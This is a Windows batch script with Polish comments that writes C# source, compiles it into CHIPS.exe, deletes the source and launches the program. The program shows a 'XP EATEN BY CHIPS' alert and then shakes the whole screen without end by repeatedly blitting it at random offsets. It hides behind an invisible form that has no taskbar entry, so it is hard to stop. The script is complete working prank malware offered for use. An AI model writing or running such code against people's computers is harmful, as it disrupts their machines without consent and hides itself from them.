@echo off
title CHIPS XP GENERATOR
color 0A

:: 1. Szukamy kompilatora (csc.exe jest w kazdym Windows z .NET)
set "csc="
for /r C:\Windows\Microsoft.NET\Framework %%f in (csc.exe) do set "csc=%%f"

if not defined csc (
    echo [!] Brak srodowiska .NET. Nie moge zbudowac CHIPS.
    pause
    exit
)

echo [*] Przygotowywanie skladnikow...

:: 2. Budujemy kod zrodlowy (Twoje ttttt / ttttt / ttttt)
echo using System; > c.cs
echo using System.Drawing; >> c.cs
echo using System.Windows.Forms; >> c.cs
echo using System.Runtime.InteropServices; >> c.cs
echo using System.Threading; >> c.cs
echo namespace CHIPS { >> c.cs
echo  class Program { >> c.cs
echo   [DllImport("user32.dll")] static extern IntPtr GetDC(IntPtr h); >> c.cs
echo   [DllImport("gdi32.dll")] static extern bool BitBlt(IntPtr d,int x,int y,int w,int h,IntPtr s,int sx,int sy,uint r); >> c.cs
echo   [DllImport("user32.dll")] static extern int GetSystemMetrics(int n); >> c.cs
echo   static void Main() { >> c.cs
echo    MessageBox.Show("XP EATEN BY CHIPS", "CHIPS", 0, (MessageBoxIcon)48); >> c.cs
echo    new Thread(delegate() { >> c.cs
echo     IntPtr hdc = GetDC(IntPtr.Zero); >> c.cs
echo     int w = GetSystemMetrics(0), h = GetSystemMetrics(1); >> c.cs
echo     Random r = new Random(); >> c.cs
echo     while(true) { >> c.cs
echo      BitBlt(hdc, r.Next(-5,6), r.Next(-5,6), w, h, hdc, 0, 0, 0x00CC0020); >> c.cs
echo      Thread.Sleep(10); >> c.cs
echo     } >> c.cs
echo    }).Start(); >> c.cs
echo    Application.Run(new Form { Opacity = 0, ShowInTaskbar = false }); >> c.cs
echo   } >> c.cs
echo  } >> c.cs
echo } >> c.cs

echo [*] Gotowanie CHIPS (Kompilacja)...

:: 3. Kompilujemy do pliku EXE
"%csc%" /target:winexe /out:CHIPS.exe /r:System.dll /r:System.Drawing.dll /r:System.Windows.Forms.dll c.cs > nul

:: 4. Sprzatanie kodu zrodlowego i odpalenie
if exist CHIPS.exe (
    del c.cs
    cls
    echo [*] CHIPS GOTOWE. SMACZNEGO!
    start CHIPS.exe
) else (
    echo [!] Cos poszlo nie tak przy smazeniu CHIPSow.
    del c.cs
)
pause
